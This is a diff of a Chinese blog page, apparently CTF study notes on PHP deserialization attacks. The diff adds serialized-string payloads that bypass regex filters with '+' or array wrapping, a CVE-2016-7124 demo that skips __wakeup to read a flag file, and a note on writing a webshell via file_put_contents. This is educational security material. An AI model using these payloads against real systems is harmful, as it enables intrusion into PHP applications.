@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">PHP反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%86%9F%E6%82%89PHP%E7%9A%84%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-text">熟悉PHP的类和方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-text">语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-text">原生类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POP%E9%93%BE"><span class="toc-text">POP链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="toc-text">常用姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E8%8E%B7%E5%8F%96%E5%88%A9%E7%94%A8"><span class="toc-text">shell获取利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-text">字符串逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wakeup-%E7%BB%95%E8%BF%87"><span class="toc-text">__wakeup()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fast-destruct"><span class="toc-text">fast-destruct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-7124"><span class="toc-text">CVE-2016-7124</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C%E7%BB%95%E8%BF%87"><span class="toc-text">C绕过</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">PHP反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%86%9F%E6%82%89PHP%E7%9A%84%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-text">熟悉PHP的类和方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-text">语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-text">原生类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POP%E9%93%BE"><span class="toc-text">POP链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="toc-text">常用姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E8%8E%B7%E5%8F%96%E5%88%A9%E7%94%A8"><span class="toc-text">shell获取利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">正则过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-text">字符串逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wakeup-%E7%BB%95%E8%BF%87"><span class="toc-text">__wakeup()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fast-destruct"><span class="toc-text">fast-destruct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-7124"><span class="toc-text">CVE-2016-7124</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C%E7%BB%95%E8%BF%87"><span class="toc-text">C绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC"><span class="toc-text">引用赋值</span></a></li></ol></li></ol></li></ol>
     </div>
   
         
@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00bcd4">反序列化</a>
+                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00a596">反序列化</a>
             </span>
             
         </span>
@@ -260,7 +260,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">737字</span>
+        <span class="post-count">1k字</span>
       </span>
     </span>
 
@@ -269,7 +269,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">3分</span>
+        <span class="post-count">4分</span>
       </span>
     </span>
     
@@ -416,10 +416,53 @@
 <h1 id="常用姿势"><a href="#常用姿势" class="headerlink" title="常用姿势"></a>常用姿势</h1><h2 id="shell获取利用"><a href="#shell获取利用" class="headerlink" title="shell获取利用"></a>shell获取利用</h2><ul>
 <li><code>file_put_contents</code>写入一句话木马</li>
 </ul>
-<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><p><code>/[oc]:\d+:/i</code>：匹配O: C: +数字</p>
+<h2 id="正则过滤绕过"><a href="#正则过滤绕过" class="headerlink" title="正则过滤绕过"></a>正则过滤绕过</h2><p><code>/[oc]:\d+:/i</code>：匹配O: C: +数字</p>
+<p><code>/^O:\d+/</code>：匹配序列化字符串是否是对象字符串开头</p>
+<ul>
+<li><p>利用加号绕过</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:4:"test":1:&#123;s:1:"a";s:3:"abc";&#125;'</span><span class="token punctuation">;</span> <span class="token comment">//+号绕过 </span>
+  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:+4'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token operator">-</span> <span class="token string backtick-quoted-string">`serialize(array($a))`</span>
+
+  <span class="token string backtick-quoted-string">``</span>`<span class="token class-name type-declaration">php</span>
+  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a:1:&#123;i:0;O:4:"test":1:&#123;s:1:"a";s:3:"abc";&#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+<hr>
 <h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a><a href="https://c1oudfl0w0.github.io/blog/2023/04/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">字符串逃逸</a></h2><p>见文章</p>
-<h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h2><h3 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast-destruct"></a>fast-destruct</h3><p>反序列化的结果赋值给一个对象时才可利用</p>
-<h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><h3 id="C绕过"><a href="#C绕过" class="headerlink" title="C绕过"></a>C绕过</h3>
+<hr>
+<h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h2><p>参考狗and猫大佬的文章：<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</a></p>
+<h3 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast-destruct"></a>fast-destruct</h3><p>具体分析：<a href="https://c1oudfl0w0.github.io/blog/2023/06/09/fast-destruct%E6%8E%A2%E7%B4%A2/">https://c1oudfl0w0.github.io/blog/2023/06/09/fast-destruct%E6%8E%A2%E7%B4%A2/</a></p>
+<p>反序列化的结果赋值给一个对象时才可利用</p>
+<h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><p>版本：PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10</p>
+<p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</p>
+<p>demo：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span> 
+    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+            <span class="token comment">//the secret is in the fl4g.php</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> 
+        <span class="token punctuation">&#125;</span> 
+    <span class="token punctuation">&#125;</span> 
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fl4g.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>结果为<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code>，而绕过就是改为<code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
+<h3 id="C绕过"><a href="#C绕过" class="headerlink" title="C绕过"></a>C绕过</h3><h3 id="引用赋值"><a href="#引用赋值" class="headerlink" title="引用赋值"></a>引用赋值</h3>
     </div>
     
     
